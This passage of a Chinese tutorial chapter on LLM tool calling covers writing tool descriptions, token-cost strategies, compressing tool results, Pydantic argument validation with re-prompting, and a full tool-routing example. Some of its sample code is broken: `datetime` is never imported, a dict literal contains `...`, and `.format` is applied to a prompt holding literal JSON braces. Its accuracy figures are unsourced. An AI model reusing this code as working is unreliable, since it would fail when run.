+<p>工具描述是 LLM 理解工具的唯一窗口。写得好，LLM 精准选择；写得差，LLM 频繁误选。</p>
+
+<div class="card">
+  <div style="margin-top: 12px;">
+    <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+      <thead>
+        <tr style="border-bottom: 2px solid var(--color-border);">
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary); width: 15%;">维度</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-error); width: 42%;">❌ 噪声描述（低信号）</th>
+          <th style="text-align: left; padding: 8px; color: var(--color-success); width: 43%;">✅ 信号描述（高信号）</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong>名称</strong></td>
+          <td style="padding: 8px; font-size: 13px;">`do_stuff`<br><span style="color: var(--color-text-tertiary);">模糊，无法区分</span></td>
+          <td style="padding: 8px; font-size: 13px;">`get_weather_by_city`<br><span style="color: var(--color-text-tertiary);">动词+对象，一目了然</span></td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong>描述</strong></td>
+          <td style="padding: 8px; font-size: 13px;">"一个工具，可以做很多事情，包括但不限于天气查询和新闻获取"<br><span style="color: var(--color-text-tertiary);">冗长，主次不分</span></td>
+          <td style="padding: 8px; font-size: 13px;">"获取指定城市的实时天气数据，包括温度、湿度、风速"<br><span style="color: var(--color-text-tertiary);">精准，覆盖关键输出</span></td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong>参数</strong></td>
+          <td style="padding: 8px; font-size: 13px;">`query: string`<br><span style="color: var(--color-text-tertiary);">无类型约束，无说明</span></td>
+          <td style="padding: 8px; font-size: 13px;">`city: string (城市名，如北京/上海)`<br>`date: string (YYYY-MM-DD格式)`<br><span style="color: var(--color-text-tertiary);">有示例，有格式约束</span></td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;"><strong>边界</strong></td>
+          <td style="padding: 8px; font-size: 13px;">不说明限制<br><span style="color: var(--color-text-tertiary);">LLM可能越界调用</span></td>
+          <td style="padding: 8px; font-size: 13px;">"仅支持中国城市，不支持海外"<br><span style="color: var(--color-text-tertiary);">明确边界，避免误用</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<h3 class="sub-heading">Token 消耗对比：全量 vs JIT vs 路由</h3>
+
+<div class="card">
+  <div class="card-title">📊 工具描述 Token 消耗对比</div>
+  <div style="margin-top: 12px;">
+    <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
+      <thead>
+        <tr style="border-bottom: 2px solid var(--color-border);">
+          <th style="text-align: left; padding: 8px; color: var(--color-text-secondary);">策略</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">传入工具数</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">描述Token</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">选择准确率</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">适用规模</th>
+          <th style="text-align: center; padding: 8px; color: var(--color-text-secondary);">额外延迟</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong style="color: var(--color-error);">全量传入</strong></td>
+          <td style="padding: 8px; text-align: center;">50 个</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-error);">~5000</td>
+          <td style="padding: 8px; text-align: center;">65%</td>
+          <td style="padding: 8px; text-align: center;">≤20 工具</td>
+          <td style="padding: 8px; text-align: center;">0ms</td>
+        </tr>
+        <tr style="border-bottom: 1px solid var(--color-border);">
+          <td style="padding: 8px;"><strong style="color: var(--color-accent);">JIT + RAG</strong></td>
+          <td style="padding: 8px; text-align: center;">3~5 个</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-success);">~300</td>
+          <td style="padding: 8px; text-align: center;">85%</td>
+          <td style="padding: 8px; text-align: center;">20~100</td>
+          <td style="padding: 8px; text-align: center;">~50ms</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;"><strong style="color: var(--color-success);">路由分层</strong></td>
+          <td style="padding: 8px; text-align: center;">3~5 个/层</td>
+          <td style="padding: 8px; text-align: center; color: var(--color-success);">~300</td>
+          <td style="padding: 8px; text-align: center;">90%</td>
+          <td style="padding: 8px; text-align: center;">100+</td>
+          <td style="padding: 8px; text-align: center;">~100ms</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+  <div style="margin-top: 12px; padding: 10px; background: var(--color-bg-tertiary); border-radius: 6px; font-size: 13px; color: var(--color-text-secondary);">
+    💡 <strong>关键洞察</strong>：全量传入 5000 token 的工具描述中，只有 ~300 token 与当前请求相关。剩下的 4700 token 是噪声——不仅浪费钱，还降低准确率。JIT 和路由策略把有效信号密度从 6% 提升到接近 100%。
+  </div>
+</div>
+
+<!-- ===== 5.12 消息压缩与工具调用链 ===== -->
+<h2 class="section-heading">5.12 消息压缩与工具调用链</h2>
+
+<p>多轮工具调用会产生<strong>Context 膨胀</strong>问题。一次搜索返回 2000 token，执行代码又返回 1500 token，3轮调用后 Context 就膨胀了上万 token——而 LLM 的有效注意力在超长 Context 中会显著衰减。</p>
+
+<div class="card">
+  <div class="card-title">📈 Context 膨胀的恶性循环</div>
+  <div style="margin-top: 16px; padding: 16px; border: 1px solid var(--color-border); border-radius: 8px;">
+    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+      <span style="font-size: 13px; color: var(--color-text-secondary); min-width: 80px;">用户请求：</span>
+      <span style="font-size: 13px;">~100 tokens</span>
+      <span style="font-size: 12px; color: var(--color-text-tertiary);">✅ 基准</span>
+    </div>
+    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+      <span style="font-size: 13px; color: var(--color-text-secondary); min-width: 80px;">工具调用①：</span>
+      <span style="font-size: 13px;">+2000 tokens（搜索结果）</span>
+      <span style="font-size: 12px; color: var(--color-warning);">⚠️ 膨胀</span>
+    </div>
+    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+      <span style="font-size: 13px; color: var(--color-text-secondary); min-width: 80px;">工具调用②：</span>
+      <span style="font-size: 13px;">+1500 tokens（代码输出）</span>
+      <span style="font-size: 12px; color: var(--color-warning);">⚠️ 膨胀</span>
+    </div>
+    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+      <span style="font-size: 13px; color: var(--color-text-secondary); min-width: 80px;">工具调用③：</span>
+      <span style="font-size: 13px;">+3000 tokens（文件内容）</span>
+      <span style="font-size: 12px; color: var(--color-error);">❌ 严重膨胀</span>
+    </div>
+    <div style="display: flex; align-items: center; gap: 12px;">
+      <span style="font-size: 13px; color: var(--color-text-secondary); min-width: 80px;">总 Context：</span>
+      <span style="font-size: 14px; color: var(--color-error);"><strong>~6600 tokens</strong></span>
+      <span style="font-size: 12px; color: var(--color-error);">❌ 原始请求只占 1.5%</span>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">工具结果压缩策略</h3>
+
+<p>解决方案的核心思路：<strong>保留关键信息，压缩冗余输出</strong>。</p>
+
+<div class="card">
+  <div style="margin-top: 16px;">
+    <strong style="color: var(--color-info);">策略①：摘要替代原始结果</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0 16px;">
+      不把工具的原始输出放入 Context，而是让 LLM 生成一段摘要。搜索返回 2000 token 的网页内容 → 摘要后 200 token。
+    </p>
+
+    <strong style="color: var(--color-accent);">策略②：选择性保留关键输出</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0 16px;">
+      只保留与当前任务相关的字段。天气 API 返回 20 个字段，用户只问温度 → 只保留温度和体感描述，丢弃湿度、气压等。
+    </p>
+
+    <strong style="color: var(--color-success);">策略③：向量库归档详细结果</strong>
+    <p style="font-size: 14px; color: var(--color-text-secondary); margin: 6px 0;">
+      完整结果存入向量数据库或内存系统，Context 中只保留摘要和引用ID。后续需要细节时，通过引用ID从向量库精确检索。
+    </p>
+  </div>
+</div>
+
+<div class="code-block">
+  <span class="code-label">工具结果压缩器</span>
+<pre>import json
+from typing import Dict, Any, List
+
+class ToolResultCompressor:
+    """多策略工具结果压缩器"""
+    
+    # 按工具类型定义需要保留的关键字段
+    KEY_FIELDS_MAP = {
+        "get_weather": ["temperature", "description", "wind_speed"],
+        "web_search":  ["title", "snippet", "url"],  # 丢弃正文
+        "run_python":  ["stdout"],                     # 丢弃 stderr 和执行日志
+        "file_read":   ["content_preview"],            # 只保留前500字符
+        "sql_query":   ["rows_summary"],               # 只保留行数统计和前5行
+    }
+    
+    # 每个工具的最大保留 token 数
+    MAX_TOKENS_MAP = {
+        "get_weather": 200,
+        "web_search":  300,
+        "run_python":  400,
+        "file_read":   500,
+        "sql_query":   300,
+    }
+    
+    def compress(self, tool_name: str, result: Dict[str, Any]) -> Dict[str, Any]:
+        """压缩工具结果：选择性保留 + 截断"""
+        compressed = {}
+        
+        # 策略②：选择性保留关键字段
+        key_fields = self.KEY_FIELDS_MAP.get(tool_name, [])
+        if key_fields:
+            for field in key_fields:
+                if field in result:
+                    compressed[field] = self._truncate(
+                        result[field],
+                        self.MAX_TOKENS_MAP.get(tool_name, 500)
+                    )
+        else:
+            # 无预定义字段 → 全量截断
+            compressed = self._truncate_dict(result, self.MAX_TOKENS_MAP.get(tool_name, 500))
+        
+        # 添加压缩元信息
+        compressed["_meta"] = {
+            "tool": tool_name,
+            "original_tokens": self._estimate_tokens(result),
+            "compressed_tokens": self._estimate_tokens(compressed),
+            "compression_ratio": round(
+                self._estimate_tokens(compressed) / max(self._estimate_tokens(result), 1), 2
+            )
+        }
+        return compressed
+    
+    def summarize_result(self, tool_name: str, result: Dict[str, Any], llm_client) -> str:
+        """策略①：让 LLM 生成摘要替代原始结果"""
+        original_text = json.dumps(result, ensure_ascii=False)
+        prompt = f"""请用2~3句话总结以下工具调用结果的关键信息。
+工具: {tool_name}
+结果: {original_text}
+只保留与用户任务最相关的信息，省略细节。"""
+        
+        summary = llm_client.chat(prompt)
+        return summary
+    
+    def archive_to_vector_store(self, tool_name: str, result: Dict[str, Any], 
+                                 vector_store, ref_id: str) -> str:
+        """策略③：完整结果归档到向量库，Context只保留引用"""
+        vector_store.store(ref_id, {
+            "tool": tool_name,
+            "result": result,
+            "timestamp": datetime.now().isoformat()
+        })
+        # Context 中只放摘要 + 引用ID
+        return f"[{tool_name}结果已归档 | ref={ref_id} | 如需详情可检索]"
+    
+    def _truncate(self, text: str, max_tokens: int) -> str:
+        """粗略截断（1 token ≈ 1.5 中文字 / 4 英文词）"""
+        max_chars = max_tokens * 2  # 保守估计
+        if len(str(text)) > max_chars:
+            return str(text)[:max_chars] + "...[已截断]"
+        return text
+    
+    def _truncate_dict(self, d: Dict, max_tokens: int) -> Dict:
+        """递归截断字典"""
+        result = {}
+        remaining = max_tokens * 2
+        for k, v in d.items():
+            entry = json.dumps({k: v}, ensure_ascii=False)
+            if len(entry) > remaining:
+                result[k] = str(v)[:remaining] + "...[截断]"
+                break
+            result[k] = v
+            remaining -= len(entry)
+        return result
+    
+    def _estimate_tokens(self, obj: Any) -> int:
+        """粗略估算 token 数"""
+        text = json.dumps(obj, ensure_ascii=False)
+        # 中文约 1.5 字/token，英文约 4 字符/token
+        return len(text) // 2
+
+# ===== 使用示例 =====
+compressor = ToolResultCompressor()
+
+# 天气工具返回了20个字段，原始2000 tokens
+weather_result = {
+    "temperature": 28, "feels_like": 30, "humidity": 65,
+    "pressure": 1013, "visibility": 10, "wind_speed": 3.2,
+    "wind_dir": "NE", "cloud_cover": 40, "uv_index": 6,
+    "description": "晴间多云", "dew_point": 18,
+    "sunrise": "05:30", "sunset": "19:45", ...  # 还有更多
+}
+
+# 压缩后只保留3个关键字段 ≈ 150 tokens
+compressed = compressor.compress("get_weather", weather_result)
+print(f"原始: {compressed['_meta']['original_tokens']} tokens")
+print(f"压缩: {compressed['_meta']['compressed_tokens']} tokens")
+print(f"压缩率: {compressed['_meta']['compression_ratio']}")
+# 输出: 原始: 2000 tokens | 压缩: 150 tokens | 压缩率: 0.075</pre>
+</div>
+
+<div class="quote">
+  好的 Agent 不是把所有信息都塞进 Context，而是像人类一样——<strong>记要点，存细节</strong>。要点放 Context（短期记忆），细节放向量库（长期记忆）。
+</div>
+
+<!-- ===== 5.13 Structured Output与工具调用 ===== -->
+<h2 class="section-heading">5.13 Structured Output 与工具调用</h2>
+
+<p>Function Calling 天然就是 Structured Output——LLM 输出 JSON 格式的函数调用。但实际场景中，我们还需要对输出做<strong>更严格的约束</strong>：参数类型校验、必填检查、格式验证。</p>
+
+<h3 class="sub-heading">Pydantic 验证工具参数</h3>
+
+<p>LLM 生成的参数可能出错：city 传了数字、date 格式不对、缺少必填参数。用 Pydantic 可以在执行前拦截这些错误：</p>
+
+<div class="code-block">
+  <span class="code-label">Pydantic 工具参数验证与重试</span>
+<pre>from pydantic import BaseModel, Field, ValidationError
+from typing import Optional
+from datetime import datetime
+
+# ===== 工具参数的 Pydantic 模型 =====
+
+class WeatherParams(BaseModel):
+    city: str = Field(..., description="城市名称", min_length=1, max_length=50)
+    date: Optional[str] = Field(
+        None, 
+        description="日期，格式 YYYY-MM-DD",
+        pattern=r"^\d{4}-\d{2}-\d{2}$"  # 正则约束格式
+    )
+
+class PythonExecParams(BaseModel):
+    code: str = Field(..., description="Python代码", min_length=1)
+    timeout: Optional[int] = Field(30, description="超时秒数", ge=1, le=300)
+
+class SearchParams(BaseModel):
+    query: str = Field(..., description="搜索关键词", min_length=1, max_length=200)
+    max_results: Optional[int] = Field(5, description="最大结果数", ge=1, le=20)
+
+# ===== 验证 + 错误处理 + 重提示 =====
+
+class StructuredToolCaller:
+    """结构化工具调用：验证 → 执行 → 重试"""
+    
+    PARAM_MODELS = {
+        "get_weather": WeatherParams,
+        "run_python": PythonExecParams,
+        "web_search": SearchParams,
+    }
+    
+    MAX_RETRIES = 2
+    
+    def call_tool(self, tool_name: str, raw_arguments: str, 
+                  llm_client, tool_executor) -> dict:
+        """完整的结构化调用流程"""
+        
+        for attempt in range(self.MAX_RETRIES + 1):
+            # ① 尝试解析和验证参数
+            try:
+                args_dict = json.loads(raw_arguments)
+                validated = self.PARAM_MODELS[tool_name](**args_dict)
+                # 验证通过 → 执行
+                result = tool_executor(tool_name, validated.model_dump())
+                return {"success": True, "result": result}
+                
+            except json.JSONDecodeError as e:
+                error_msg = f"参数JSON格式错误: {e}"
+            except ValidationError as e:
+                # ② Pydantic 校验失败 → 收集具体错误
+                error_msg = self._format_validation_error(e)
+            
+            # ③ 校验失败 → 重提示 LLM 修正参数
+            if attempt < self.MAX_RETRIES:
+                print(f"⚠️ 参数校验失败（第{attempt+1}次）: {error_msg}")
+                correction_prompt = f"""你上一次调用工具 {tool_name} 的参数有错误：
+{error_msg}
+请重新生成正确的函数调用参数。注意遵守以下约束：
+{self._get_constraints(tool_name)}"""
+                raw_arguments = llm_client.chat(correction_prompt)
+            else:
+                # 超过重试次数 → 返回错误
+                return {"success": False, "error": error_msg}
+    
+    def _format_validation_error(self, e: ValidationError) -> str:
+        """将 Pydantic 错误格式化为 LLM 可理解的提示"""
+        errors = []
+        for err in e.errors():
+            field = ".".join(str(loc) for loc in err["loc"])
+            errors.append(f"字段 '{field}': {err['msg']} (当前值: {err.get('input', '未提供')})")
+        return "\n".join(errors)
+    
+    def _get_constraints(self, tool_name: str) -> str:
+        """返回工具的参数约束描述（给 LLM 的修正指引）"""
+        model = self.PARAM_MODELS[tool_name]
+        constraints = []
+        for name, field in model.model_fields.items():
+            desc = field.description or ""
+            if field.is_required():
+                desc += " [必填]"
+            constraints.append(f"  {name} ({field.annotation}): {desc}")
+        return "\n".join(constraints)
+
+# ===== 使用示例 =====
+
+caller = StructuredToolCaller()
+
+# LLM 生成了错误参数: city 传了空字符串，date 格式不对
+raw_args = '{"city": "", "date": "2026/07/02"}'
+
+result = caller.call_tool("get_weather", raw_args, llm_client, weather_executor)
+
+# 第1次: Pydantic 校验失败
+#   ⚠️ 参数校验失败（第1次）: 
+#   字段 'city': String should have at least 1 character (当前值: )
+#   字段 'date': String should match pattern ^\d{4}-\d{2}-\d{2}$ (当前值: 2026/07/02)
+# → 重提示 LLM → LLM 修正为 '{"city": "北京", "date": "2026-07-02"}'
+# 第2次: 验证通过 → 执行成功</pre>
+</div>
+
+<h3 class="sub-heading">输出格式约束技巧</h3>
+
+<div class="card">
+  <div class="card-title">🔧 强制结构化输出的5种技巧</div>
+  <div style="margin-top: 16px;">
+
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">① JSON Schema 约束</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        Function Calling 自带的 JSON Schema 描述参数类型。最基础也是最有效的约束。
+      </p>
+    </div>
+
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">② Pydantic 双重验证</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        LLM 输出 → JSON Schema 格式校验 → Pydantic 语义校验（正则、范围、必填）。两层过滤，几乎杜绝格式错误。
+      </p>
+    </div>
+
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">③ 参数枚举约束</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        对有限选项的参数使用 <code>enum</code>。如单位参数只允许 ["metric", "imperial"]，LLM 不会输出奇怪值。
+      </p>
+    </div>
+
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; margin-bottom: 12px; border-left: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">④ 错误重提示循环</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        校验失败时不直接报错，而是把具体错误信息反馈给 LLM，让它自行修正。最多重试 2~3 次，成功率极高。
+      </p>
+    </div>
+
+    <div style="padding: 12px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">⑤ 降级兜底</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 6px 0;">
+        重试次数用尽后，用默认值填充缺失参数或跳过可选参数。不让一个格式错误导致整个 Agent 流程中断。
+      </p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== 5.14 实战：构建智能工具路由系统 ===== -->
+<h2 class="section-heading">5.14 实战：构建智能工具路由系统</h2>
+
+<p>把 5.7~5.10 的概念串起来，构建一个完整的<strong>意图识别 → 工具检索 → 工具调用 → 结果压缩 → 结构化验证</strong>全链路 Agent。</p>
+
+<div class="flowchart-container" id="smartRouterFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('smartRouterFlow', {
+    nodes: [
+      { id: 'user', label: '用户请求', type: 'start' },
+      { id: 'intent', label: '意图识别\n分类+拆解', type: 'process' },
+      { id: 'retrieve', label: 'Tool RAG\n检索候选工具', type: 'process' },
+      { id: 'llm_select', label: 'LLM 选择\n具体工具+参数', type: 'process' },
+      { id: 'validate', label: 'Pydantic\n参数验证', type: 'decision' },
+      { id: 'retry', label: '重提示LLM\n修正参数', type: 'process' },
+      { id: 'execute', label: '执行\n工具函数', type: 'tool' },
+      { id: 'compress', label: '结果压缩\n摘要+归档', type: 'process' },
+      { id: 'response', label: 'LLM 生成\n自然语言回答', type: 'process' },
+      { id: 'output', label: '返回用户', type: 'end' }
+    ],
+    edges: [
+      { from: 'user', to: 'intent' },
+      { from: 'intent', to: 'retrieve' },
+      { from: 'retrieve', to: 'llm_select' },
+      { from: 'llm_select', to: 'validate' },
+      { from: 'validate', to: 'execute', label: '验证通过' },
+      { from: 'validate', to: 'retry', label: '验证失败' },
+      { from: 'retry', to: 'llm_select', label: '修正后重选' },
+      { from: 'execute', to: 'compress' },
+      { from: 'compress', to: 'response' },
+      { from: 'response', to: 'output' }
+    ],
+    animate: true
+  });
+}, 300);
+</script>
+
+<div class="code-block">
+  <span class="code-label">智能工具路由系统 — 完整代码</span>
+<pre>"""
+SmartToolRouter: 意图识别 → 工具检索 → 参数验证 → 执行 → 结果压缩 全链路
+"""
+import json
+import uuid
+from typing import List, Dict, Any, Optional
+from enum import Enum
+from pydantic import BaseModel, ValidationError
+
+# ===== 5.10 意图识别 =====
+
+class IntentType(Enum):
+    INFO_QUERY = "信息获取"
+    CODE_EXEC = "代码执行"
+    FILE_OP = "文件操作"
+    COMM_INTERACT = "通信交互"
+
+class Intent(BaseModel):
+    type: IntentType
+    text: str
+    target: str
+    priority: int = 0
+    depends_on: Optional[List[str]] = None
+
+class IntentClassifier:
+    """意图分类器 — 使用 LLM 做意图识别"""
+    
+    INTENT_PROMPT = """分析以下用户请求的意图，返回JSON：
+请求: "{query}"
+请识别：
+1. 意图类型: 信息获取/代码执行/文件操作/通信交互
+2. 具体目标: 用户想要什么
+3. 是否包含多个意图(复合请求)，如有则拆解
+
+返回格式:
+{"intents": [{"type": "类型", "text": "原文片段", "target": "目标", "priority": 优先级数字}]}
+如果意图间有依赖关系，在depends_on中指明前置意图的target。"""
+
+    def classify(self, query: str, llm_client) -> List[Intent]:
+        prompt = self.INTENT_PROMPT.format(query=query)
+        response = llm_client.chat(prompt)
+        parsed = json.loads(response)
+        intents = [Intent(**i) for i in parsed["intents"]]
+        return intents
+
+# ===== 5.11 Tool RAG =====
+
+class ToolRAG:
+    """向量检索工具描述"""
+    
+    def __init__(self, vector_store, all_tools: List[Dict]):
+        self.vector_store = vector_store
+        self.all_tools = all_tools
+        # 注册所有工具描述到向量库
+        for tool in all_tools:
+            text = self._tool_to_text(tool)
+            self.vector_store.upsert(tool["function"]["name"], text)
+    
+    def _tool_to_text(self, tool: Dict) -> str:
+        f = tool["function"]
+        text = f"{f['name']}: {f['description']}"
+        for pname, pinfo in f.get("parameters", {}).get("properties", {}).items():
+            text += f" | {pname}({pinfo.get('type','')}): {pinfo.get('description','')}"
+        return text
+    
+    def retrieve(self, query: str, top_k: int = 5) -> List[Dict]:
+        """根据意图检索最相关的工具"""
+        results = self.vector_store.search(query, top_k=top_k)
+        tool_names = [r["id"] for r in results]
+        return [t for t in self.all_tools if t["function"]["name"] in tool_names]
+
+# ===== 5.13 结构化验证 =====
+
+# 定义参数模型（按工具）
+class WeatherParams(BaseModel):
+    city: str
+    date: Optional[str] = None
+
+class SearchParams(BaseModel):
+    query: str
+    max_results: Optional[int] = 5
+
+class PythonParams(BaseModel):
+    code: str
+    timeout: Optional[int] = 30
+
+PARAM_MODELS = {
+    "get_weather": WeatherParams,
+    "web_search": SearchParams,
+    "run_python": PythonParams,
+}
+
+# ===== 5.12 结果压缩 =====
+
+class ResultCompressor:
+    """工具结果压缩"""
+    
+    KEY_FIELDS = {
+        "get_weather": ["temperature", "description", "wind_speed"],
+        "web_search": ["title", "snippet", "url"],
+        "run_python": ["stdout"],
+    }
+    MAX_CHARS = 500
+    
+    def compress(self, tool_name: str, result: Any) -> Dict:
+        keys = self.KEY_FIELDS.get(tool_name, [])
+        compressed = {}
+        if isinstance(result, dict) and keys:
+            for k in keys:
+                if k in result:
+                    val = str(result[k])
+                    compressed[k] = val[:self.MAX_CHARS] if len(val) > self.MAX_CHARS else val
+        else:
+            compressed["summary"] = str(result)[:self.MAX_CHARS]
+        compressed["_meta"] = {
+            "tool": tool_name, 
+            "ref_id": str(uuid.uuid4())  # 用于向量库归档引用
+        }
+        return compressed
+
+# ===== 全链路路由 =====
+
+class SmartToolRouter:
+    """智能工具路由系统 — 全链路"""
+    
+    def __init__(self, llm_client, vector_store, all_tools, tool_executor):
+        self.llm = llm_client
+        self.intent_classifier = IntentClassifier()
+        self.tool_rag = ToolRAG(vector_store, all_tools)
+        self.result_compressor = ResultCompressor()
+        self.tool_executor = tool_executor
+        self.max_retries = 2
+    
+    def process(self, user_query: str) -> str:
+        """完整处理流程"""
+        
+        # ① 意图识别
+        intents = self.intent_classifier.classify(user_query, self.llm)
+        print(f"[意图识别] 检测到 {len(intents)} 个意图:")
+        for i, intent in enumerate(intents):
+            print(f"  {i+1}. {intent.type.value} → {intent.target}")
+        
+        # ② 按意图检索候选工具
+        all_relevant_tools = []
+        for intent in intents:
+            tools = self.tool_rag.retrieve(intent.target, top_k=3)
+            all_relevant_tools.extend(tools)
+        # 去重
+        seen = set()
+        unique_tools = []
+        for t in all_relevant_tools:
+            name = t["function"]["name"]
+            if name not in seen:
+                seen.add(name)
+                unique_tools.append(t)
+        
+        print(f"[工具检索] 命中 {len(unique_tools)} 个候选工具: {[t['function']['name'] for t in unique_tools]}")
+        
+        # ③ 让 LLM 在候选工具中选择 + 生成参数
+        # 只传候选工具描述（JIT策略），而非全部工具
+        tool_call_results = []
+        for intent in intents:
+            # 按意图过滤最相关工具
+            intent_tools = self.tool_rag.retrieve(intent.target, top_k=3)
+            
+            # LLM 选择工具和参数
+            llm_response = self.llm.call_with_tools(
+                messages=[{"role": "user", "content": intent.text}],
+                tools=intent_tools
+            )
+            
+            if not llm_response.tool_calls:
+                # LLM 认为不需要工具 → 直接回答
+                tool_call_results.append({
+                    "intent": intent.type.value,
+                    "direct_answer": llm_response.content
+                })
+                continue
+            
+            # ④ 结构化验证 + 执行 + 重试
+            for tool_call in llm_response.tool_calls:
+                result = self._execute_with_validation(
+                    tool_call.function.name,
+                    tool_call.function.arguments
+                )
+                
+                # ⑤ 结果压缩
+                compressed = self.result_compressor.compress(
+                    tool_call.function.name, result
+                )
+                tool_call_results.append({
+                    "intent": intent.type.value,
+                    "tool": tool_call.function.name,
+                    "result": compressed
+                })
+        
+        # ⑥ LLM 整合所有结果，生成自然语言回答
+        final_prompt = f"""用户原始请求: {user_query}
+以下是为您收集的工具调用结果:
+{json.dumps(tool_call_results, ensure_ascii=False)}
+请整合这些结果，给用户一个清晰有用的回答。"""
+        
+        final_answer = self.llm.chat(final_prompt)
+        return final_answer
+    
+    def _execute_with_validation(self, tool_name: str, raw_args: str) -> Any:
+        """参数验证 → 执行 → 重试"""
+        param_model = PARAM_MODELS.get(tool_name)
+        
+        for attempt in range(self.max_retries + 1):
+            try:
+                args_dict = json.loads(raw_args)
+                if param_model:
+                    validated = param_model(**args_dict)
+                    args_dict = validated.model_dump()
+                return self.tool_executor(tool_name, args_dict)
+                
+            except (json.JSONDecodeError, ValidationError) as e:
+                if attempt < self.max_retries:
+                    error_detail = str(e)
+                    correction = self.llm.chat(
+                        f"工具 {tool_name} 参数校验失败: {error_detail}\n"
+                        f"请修正参数，确保符合约束。"
+                    )
+                    raw_args = correction
+                else:
+                    return {"error": f"参数校验失败（已重试{self.max_retries}次）: {str(e)}"}
+
+# ===== 运行 =====
+
+router = SmartToolRouter(
+    llm_client=my_llm,
+    vector_store=my_vector_db,
+    all_tools=ALL_50_TOOLS,
+    tool_executor=execute_tool_function
+)
+
+answer = router.process("帮我搜索最新的AI论文并用Python分析引用趋势")
+# [意图识别] 检测到 2 个意图:
+#   1. 信息获取 → 最新的AI论文
+#   2. 代码执行 → 分析引用趋势
+# [工具检索] 命中 4 个候选工具: ['web_search', 'news_api', 'run_python', 'sql_executor']
+# → 参数验证通过 → 执行 → 结果压缩 → 整合回答</pre>
+</div>
+
+<div class="summary-box">
+  <div class="summary-title">🔗 5.7~5.14 小结：工具调用的进阶体系</div>
+  <div style="margin-top: 12px; font-size: 14px; line-height: 1.8;">
+    <strong>Skill匹配与路由</strong>（5.7）是精准——混合策略让 Agent 从众多Skill中精准定位最合适的一个。<br>
+    <strong>Skill分层体系</strong>（5.8）是架构——L0原子操作、L1流程编排、L2业务专家，职责清晰不混乱。<br>
+    <strong>Skill沉淀机制</strong>（5.9）是成长——自动/半自动/手动三种方式，让系统越用越聪明。<br>
+    <strong>意图识别</strong>（5.10）是入口——理解用户想做什么，才能选到对的工具。<br>
+    <strong>上下文工程</strong>（5.11）是效率——JIT加载和 Tool RAG 让 LLM 只看相关的工具描述，减少 token 浪费。<br>
+    <strong>消息压缩</strong>（5.12）是控制——多轮工具调用会 Context 膨胀，压缩策略保持 Context 精瘦。<br>
+    <strong>结构化输出</strong>（5.13）是安全——Pydantic 验证 + 重提示循环，杜绝参数格式错误。<br>
+    <strong>实战系统</strong>（5.14）是闭环——从意图到回答的全链路，每个环节都有策略保障。<br><br>
+    <div style="padding: 10px; background: var(--color-bg-tertiary); border-radius: 6px;">
+      💡 一句话总结：<strong>好的工具调用不是"把所有工具丢给 LLM 让它选"，而是精心设计匹配→分层→沉淀→意图→检索→验证→压缩的每一步</strong>。
+    </div>
+  </div>
+</div>
+
+<!-- ===== 八股总结 ===== -->
+<!-- ===== 5.15 工程深度：工具并发控制与弱模型兼容 ===== -->
+<h2 class="section-heading">5.15 工程深度：工具并发控制与弱模型兼容</h2>
+
+<p>前面的章节介绍了工具调用的原理和 Skill 体系，但在生产环境中，Agent 的工具系统还面临三个工程挑战：<strong>并发控制</strong>（多个工具能不能同时执行）、<strong>权限安全</strong>（危险命令怎么拦截）、<strong>弱模型兼容</strong>（不是所有模型都输出标准的 tool_calls）。本节基于 WaLiCode 项目的真实实现，讲解这三个关键设计。</p>
+
+<h3 class="sub-heading">5.15.1 工具并发安全分类</h3>
+
+<p>简单 Agent 串行调用工具就够了——一次只调一个，等结果回来再调下一个。但生产级 Agent 面临的场景是：AI 一次可能输出 3-5 个工具调用（比如同时读取 3 个文件），如果串行执行，用户要等 3 倍的时间。</p>
+
